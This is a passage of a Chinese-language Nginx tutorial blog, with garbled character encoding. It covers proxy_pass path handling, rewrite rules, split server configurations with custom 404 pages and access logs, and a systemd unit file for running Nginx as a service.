class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>        listen       <span class="hljs-number">8081</span>;<br>        server_name  localhost;<br> <br>        location / &#123;<br>            root   html;<br>            index  index.html index.htm;<br>        &#125;<br><span class="hljs-comment">#æƒ…æ™¯1:proxy_passåæœ‰/ ï¼Œè¡¨ç»å¯¹è·¯å¾„ï¼Œä¸æŠŠåŒ¹é…éƒ¨åˆ†åŠ å…¥æœ€ç»ˆä»£ç†è·¯å¾„ï¼ˆlocation å’Œproxy_passç»“å°¾ä¸€è‡´ï¼‰</span><br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/WCP.Service/wcp/modeladapter/download/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://10.194.171.7:13082/modeladapter/download/asc.shtml</span><br>location <span class="hljs-regexp">/WCP.Service/</span>wcp<span class="hljs-regexp">/modeladapter/</span>download/ &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">10.194</span>.<span class="hljs-number">171.7</span>:<span class="hljs-number">13082</span><span class="hljs-regexp">/modeladapter/</span>download/;<br>        &#125;<br>        <br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://127.0.0.1:8082/model/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/model/</span>;<br>        &#125;<br>        <br>        <br><span class="hljs-comment">#æƒ…æ™¯2:proxy_passåæœ‰/ ï¼Œè¡¨ç»å¯¹è·¯å¾„ï¼Œä¸æŠŠåŒ¹é…éƒ¨åˆ†åŠ å…¥æœ€ç»ˆä»£ç†è·¯å¾„ï¼ˆlocation å’Œproxy_passç»“å°¾ä¸ä¸€è‡´ï¼‰</span><br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://127.0.0.1:8082/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/;<br>        &#125;<br><span class="hljs-comment">#æƒ…æ™¯3ï¼šproxy_passåæ²¡æœ‰ / ï¼ŒNginxä¼šæŠŠåŒ¹é…éƒ¨åˆ†å¸¦åˆ°ä»£ç†çš„url</span><br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://127.0.0.1:8082/model/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>;<br>        &#125;<br> <br><span class="hljs-comment">#æƒ…æ™¯4</span><br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://127.0.0.1:8082/AAAmodel/asc.shtml</span><br>location <span class="hljs-regexp">/model/</span> &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/AAA;<br>        &#125;<br><span class="hljs-comment">#æƒ…æ™¯5</span><br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/model/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://127.0.0.1:8082/asc.shtml</span><br>location /model &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/;<br>        &#125;<br><span class="hljs-comment">#æƒ…æ™¯6</span><br>        <span class="hljs-comment">#è®¿é—®åœ°å€ï¼šhttp://localhost:8081/modelBBB/asc.shtml</span><br>        <span class="hljs-comment">#æœ€ç»ˆä»£ç†ï¼šhttp://127.0.0.1:8082/asc.shtml</span><br>location /model &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8082</span>/;<br>        &#125;<br> <br> <br>location /opus-front-sso &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">10.194</span>.<span class="hljs-number">170.94</span>/opus-front-sso;<br>        &#125;<br>location /awater &#123;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">10.194</span>.<span class="hljs-number">170.94</span>/awater;<br>        &#125;<br> <br>        <br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">server &#123;<br>        listen <span class="hljs-number">39002</span>;<br>        server_name  linux.nginx;<br>        location  <span class="hljs-regexp">/url/</span> &#123;<br>            rewrite ^<span class="hljs-regexp">/win/</span>(.*)$ <span class="hljs-regexp">/$1/</span> <span class="hljs-keyword">break</span>;<br>            proxy_pass   http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">23.1</span>:<span class="hljs-number">8091</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><a href="http://linux.nginx:39002/url/aa">http://linux.nginx:39002/url/aa</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url/ &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091/;<br>        &#125;<br>    &#125;<br><span class="hljs-comment">#http://192.168.23.1:8091/aa</span><br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url/ &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091/;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#http://192.168.23.1:8091/url/aa</span><br>    <br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091/;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">#http://192.168.23.1:8091/aa</span><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39002</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <span class="hljs-section">location</span>  /url &#123;<br>            <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span>/ <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:8091;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">#http://192.168.23.1:8091/url/aa</span><br></code></pre></td></tr></table></figure><h1 id="nginxè¿›é˜¶ç¯‡"><a class="markdownIt-Anchor" href="#nginxè¿›é˜¶ç¯‡"></a> Nginxè¿›é˜¶ç¯‡</h1><h2 id="nginxæœåŠ¡å™¨åŸºç¡€é…ç½®å®ä¾‹"><a class="markdownIt-Anchor" href="#nginxæœåŠ¡å™¨åŸºç¡€é…ç½®å®ä¾‹"></a> NginxæœåŠ¡å™¨åŸºç¡€é…ç½®å®ä¾‹</h2><p>å‰é¢æˆ‘ä»¬å·²ç»å¯¹NginxæœåŠ¡å™¨é»˜è®¤é…ç½®æ–‡ä»¶çš„ç»“æ„å’Œæ¶‰åŠçš„åŸºæœ¬æŒ‡ä»¤åšäº†è¯¦ç»†çš„é˜è¿°ã€‚é€šè¿‡è¿™äº›æŒ‡ä»¤çš„åˆç†é…ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®©ä¸€å°NginxæœåŠ¡å™¨æ­£å¸¸å·¥ä½œï¼Œå¹¶ä¸”æä¾›åŸºæœ¬çš„webæœåŠ¡å™¨åŠŸèƒ½ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†é€šè¿‡ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´å’Œæœ€ç®€å•çš„åŸºç¡€é…ç½®å®ä¾‹ï¼Œæ¥å·©å›ºä¸‹å‰é¢æ‰€å­¦ä¹ çš„æŒ‡ä»¤åŠå…¶é…ç½®ã€‚</p><p>éœ€æ±‚å¦‚ä¸‹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">ï¼ˆ<span class="hljs-number">1</span>ï¼‰æœ‰å¦‚ä¸‹è®¿é—®ï¼š<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/server1/</span>location1<br>è®¿é—®çš„æ˜¯ï¼šindex_sr1_location1.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/server1/</span>location2<br>è®¿é—®çš„æ˜¯ï¼šindex_sr1_location2.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/server2/</span>location1<br>è®¿é—®çš„æ˜¯ï¼šindex_sr2_location1.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/server2/</span>location2<br>è®¿é—®çš„æ˜¯ï¼šindex_sr2_location2.html<br>ï¼ˆ<span class="hljs-number">2</span>ï¼‰å¦‚æœè®¿é—®çš„èµ„æºä¸å­˜åœ¨ï¼Œ<br>è¿”å›è‡ªå®šä¹‰çš„<span class="hljs-number">404</span>é¡µé¢<br>ï¼ˆ<span class="hljs-number">3</span>ï¼‰å°†<span class="hljs-regexp">/server1å’Œ/</span>server2çš„é…ç½®ä½¿ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶åˆ†å‰²<br>å°†æ–‡ä»¶æ”¾åˆ°<span class="hljs-regexp">/home/</span>www/conf.dç›®å½•ä¸‹ï¼Œç„¶åä½¿ç”¨includeè¿›è¡Œåˆå¹¶<br>ï¼ˆ<span class="hljs-number">4</span>ï¼‰ä¸º<span class="hljs-regexp">/server1å’Œ/</span>server2å„è‡ªåˆ›å»ºä¸€ä¸ªè®¿é—®æ—¥å¿—æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>å‡†å¤‡ç›¸å…³æ–‡ä»¶ï¼Œç›®å½•å¦‚ä¸‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129309340.png" alt="1587129309340" /></p><p>é…ç½®çš„å†…å®¹å¦‚ä¸‹:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs clean">##å…¨å±€å— begin##<br>#é…ç½®å…è®¸è¿è¡ŒNginxå·¥ä½œè¿›ç¨‹çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„<br>user www;<br>#é…ç½®è¿è¡ŒNginxè¿›ç¨‹ç”Ÿæˆçš„workerè¿›ç¨‹æ•°<br>worker_processes <span class="hljs-number">2</span>;<br>#é…ç½®NginxæœåŠ¡å™¨è¿è¡Œå¯¹é”™è¯¯æ—¥å¿—å­˜æ”¾çš„è·¯å¾„<br>error_log logs/error.log;<br>#é…ç½®NginxæœåŠ¡å™¨å…è®¸æ—¶è®°å½•Nginxçš„masterè¿›ç¨‹çš„PIDæ–‡ä»¶è·¯å¾„å’Œåç§°<br>pid logs/nginx.pid;<br>#é…ç½®NginxæœåŠ¡æ˜¯å¦ä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹æ³•å¯åŠ¨<br>#daemon on;<br>##å…¨å±€å— end##<br><br>##eventså— begin##<br>events&#123;<br>#è®¾ç½®Nginxç½‘ç»œè¿æ¥åºåˆ—åŒ–<br>accept_mutex on;<br>#è®¾ç½®Nginxçš„workerè¿›ç¨‹æ˜¯å¦å¯ä»¥åŒæ—¶æ¥æ”¶å¤šä¸ªè¯·æ±‚<br>multi_accept on;<br>#è®¾ç½®Nginxçš„workerè¿›ç¨‹æœ€å¤§çš„è¿æ¥æ•°<br>worker_connections <span class="hljs-number">1024</span>;<br>#è®¾ç½®Nginxä½¿ç”¨çš„äº‹ä»¶é©±åŠ¨æ¨¡å‹<br>use epoll;<br>&#125;<br>##eventså— end##<br>##httpå— start##<br>http&#123;<br>#å®šä¹‰MIME-Type<br>include mime.types;<br>default_type application/octet-stream;<br>#é…ç½®å…è®¸ä½¿ç”¨sendfileæ–¹å¼è¿è¾“<br>sendfile on;<br>#é…ç½®è¿æ¥è¶…æ—¶æ—¶é—´<br>keepalive_timeout <span class="hljs-number">65</span>;<br>#é…ç½®è¯·æ±‚å¤„ç†æ—¥å¿—æ ¼å¼<br>log_format server1 <span class="hljs-string">&#x27;===&gt;server1 access log&#x27;</span>;<br>log_format server2 <span class="hljs-string">&#x27;===&gt;server2 access log&#x27;</span>;<br><br>##serverå— å¼€å§‹##<br>include /home/www/conf.d<span class="hljs-comment">/*.conf;</span><br><span class="hljs-comment">##serverå— ç»“æŸ##</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">##httpå— end##</span><br></code></pre></td></tr></table></figure><p>server1.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">server&#123;<br><span class="hljs-comment">#é…ç½®ç›‘å¬ç«¯å£å’Œä¸»æœºåç§°</span><br>listen <span class="hljs-number">8081</span>;<br>server_name localhost;<br><span class="hljs-comment">#é…ç½®è¯·æ±‚å¤„ç†æ—¥å¿—å­˜æ”¾è·¯å¾„</span><br>access_log <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/myweb/</span>server1<span class="hljs-regexp">/logs/</span>access.log server1;<br><span class="hljs-comment">#é…ç½®é”™è¯¯é¡µé¢</span><br>error_page <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.html;<br><span class="hljs-comment">#é…ç½®å¤„ç†/server1/location1è¯·æ±‚çš„location</span><br>location <span class="hljs-regexp">/server1/</span>location1&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr1_location1.html;<br>&#125;<br><span class="hljs-comment">#é…ç½®å¤„ç†/server1/location2è¯·æ±‚çš„location</span><br>location <span class="hljs-regexp">/server1/</span>location2&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr1_location2.html;<br>&#125;<br><span class="hljs-comment">#é…ç½®é”™è¯¯é¡µé¢è½¬å‘</span><br>location = /<span class="hljs-number">404</span>.html &#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index <span class="hljs-number">404</span>.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>server2.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">server&#123;<br><span class="hljs-comment">#é…ç½®ç›‘å¬ç«¯å£å’Œä¸»æœºåç§°</span><br>listen <span class="hljs-number">8082</span>;<br>server_name localhost;<br><span class="hljs-comment">#é…ç½®è¯·æ±‚å¤„ç†æ—¥å¿—å­˜æ”¾è·¯å¾„</span><br>access_log <span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/myweb/</span>server2<span class="hljs-regexp">/logs/</span>access.log server2;<br><span class="hljs-comment">#é…ç½®é”™è¯¯é¡µé¢,å¯¹404.htmlåšäº†å®šå‘é…ç½®</span><br>error_page <span class="hljs-number">404</span> /<span class="hljs-number">404</span>.html;<br><span class="hljs-comment">#é…ç½®å¤„ç†/server1/location1è¯·æ±‚çš„location</span><br>location <span class="hljs-regexp">/server2/</span>location1&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr2_location1.html;<br>&#125;<br><span class="hljs-comment">#é…ç½®å¤„ç†/server2/location2è¯·æ±‚çš„location</span><br>location <span class="hljs-regexp">/server2/</span>location2&#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index index_sr2_location2.html;<br>&#125;<br><span class="hljs-comment">#é…ç½®é”™è¯¯é¡µé¢è½¬å‘</span><br>location = /<span class="hljs-number">404</span>.html &#123;<br>root <span class="hljs-regexp">/home/</span>www/myweb;<br>index <span class="hljs-number">404</span>.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®æµ‹è¯•ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129766585.png" alt="1587129766585" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129777898.png" alt="1587129777898" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587290246228.png" alt="1587290246228" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129805309.png" alt="1587129805309" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587129817226.png" alt="1587129817226" /></p><h2 id="nginxæœåŠ¡æ“ä½œçš„é—®é¢˜"><a class="markdownIt-Anchor" href="#nginxæœåŠ¡æ“ä½œçš„é—®é¢˜"></a> NginxæœåŠ¡æ“ä½œçš„é—®é¢˜</h2><p>ç»è¿‡å‰é¢çš„æ“ä½œï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œå¦‚æœæƒ³è¦å¯åŠ¨ã€å…³é—­æˆ–é‡æ–°åŠ è½½nginxé…ç½®æ–‡ä»¶ï¼Œéƒ½éœ€è¦å…ˆè¿›å…¥åˆ°nginxçš„å®‰è£…ç›®å½•çš„sbinç›®å½•ï¼Œç„¶åä½¿ç”¨nginxçš„äºŒçº§åˆ¶å¯æ‰§è¡Œæ–‡ä»¶æ¥æ“ä½œï¼Œç›¸å¯¹æ¥è¯´æ“ä½œæ¯”è¾ƒç¹çï¼Œè¿™å—è¯¥å¦‚ä½•ä¼˜åŒ–ï¼Ÿå¦å¤–å¦‚æœæˆ‘ä»¬æƒ³æŠŠNginxè®¾ç½®æˆéšç€æœåŠ¡å™¨å¯åŠ¨å°±è‡ªåŠ¨å®Œæˆå¯åŠ¨æ“ä½œï¼Œåˆè¯¥å¦‚ä½•æ¥å®ç°?è¿™å°±éœ€è¦ç”¨åˆ°æ¥ä¸‹æ¥æˆ‘ä»¬è¦è®²è§£çš„ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">Nginxé…ç½®æˆç³»ç»ŸæœåŠ¡<br>Nginxå‘½ä»¤é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ<br></code></pre></td></tr></table></figure><h2 id="nginxé…ç½®æˆç³»ç»ŸæœåŠ¡"><a class="markdownIt-Anchor" href="#nginxé…ç½®æˆç³»ç»ŸæœåŠ¡"></a> Nginxé…ç½®æˆç³»ç»ŸæœåŠ¡</h2><p>æŠŠNginxåº”ç”¨æœåŠ¡è®¾ç½®æˆä¸ºç³»ç»ŸæœåŠ¡ï¼Œæ–¹ä¾¿å¯¹NginxæœåŠ¡çš„å¯åŠ¨å’Œåœæ­¢ç­‰ç›¸å…³æ“ä½œï¼Œå…·ä½“å®ç°æ­¥éª¤:</p><p>(1) åœ¨<code>/usr/lib/systemd/system</code>ç›®å½•ä¸‹æ·»åŠ nginx.service,å†…å®¹å¦‚ä¸‹:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>system/nginx.service<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">[Unit]<br>Description=nginx web service<br>Documentation=http:<span class="hljs-regexp">//</span>nginx.org<span class="hljs-regexp">/en/</span>docs/<br>After=network.target<br><br>[Service]<br>Type=forking<br>PIDFile=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>logs/nginx.pid<br>ExecStartPre=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<span class="hljs-regexp">/nginx -t -c /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>ExecStart=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx<br>ExecReload=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s reload<br>ExecStop=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -s stop<br>PrivateTmp=true<br><br>[Install]<br>WantedBy=default.target<br></code></pre></td></tr></table></figure><p>(2)æ·»åŠ å®Œæˆåå¦‚æœæƒé™æœ‰é—®é¢˜éœ€è¦è¿›è¡Œæƒé™è®¾ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod <span class="hljs-number">755</span> <span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>system/nginx.service<br></code></pre></td></tr></table></figure><p>(3)ä½¿ç”¨ç³»ç»Ÿå‘½ä»¤æ¥æ“ä½œNginxæœåŠ¡</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">å¯åŠ¨: systemctl start nginx</span><br><span class="hljs-section">åœæ­¢: systemctl stop nginx</span><br><span class="hljs-section">é‡å¯: systemctl restart nginx</span><br><span class="hljs-section">é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶: systemctl reload nginx</span><br><span class="hljs-section">æŸ¥çœ‹nginxçŠ¶æ€: systemctl status nginx</span><br><span class="hljs-section">å¼€æœºå¯åŠ¨: systemctl enable nginx</span><br></code></pre></td></tr></table></figure><h2 id="nginxå‘½ä»¤é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ"><a class="markdownIt-Anchor" href="#nginxå‘½ä»¤é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ"></a> Nginxå‘½ä»¤é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ</h2><p>å‰é¢æˆ‘ä»¬ä»‹ç»è¿‡Nginxå®‰è£…ç›®å½•ä¸‹çš„äºŒçº§åˆ¶å¯æ‰§è¡Œæ–‡ä»¶<code>nginx</code>çš„å¾ˆå¤šå‘½ä»¤ï¼Œè¦æƒ³ä½¿ç”¨è¿™äº›å‘½ä»¤å‰ææ˜¯éœ€è¦è¿›å…¥sbinç›®å½•ä¸‹æ‰èƒ½ä½¿ç”¨ï¼Œå¾ˆä¸æ–¹ä¾¿ï¼Œå¦‚ä½•å»ä¼˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¯¥äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶åŠ å…¥åˆ°ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œè¿™æ ·çš„è¯åœ¨ä»»ä½•ç›®å½•éƒ½å¯ä»¥ä½¿ç”¨nginxå¯¹åº”çš„ç›¸å…³å‘½ä»¤ã€‚å…·ä½“å®ç°æ­¥éª¤å¦‚ä¸‹:</p><p>æ¼”ç¤ºå¯åˆ é™¤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin/nginx -V<br>cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin  nginx -V<br>å¦‚ä½•ä¼˜åŒ–ï¼Ÿï¼Ÿï¼Ÿ<br></code></pre></td></tr></table></figure><p>(1)ä¿®æ”¹<code>/etc/profile</code>æ–‡ä»¶</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">vim 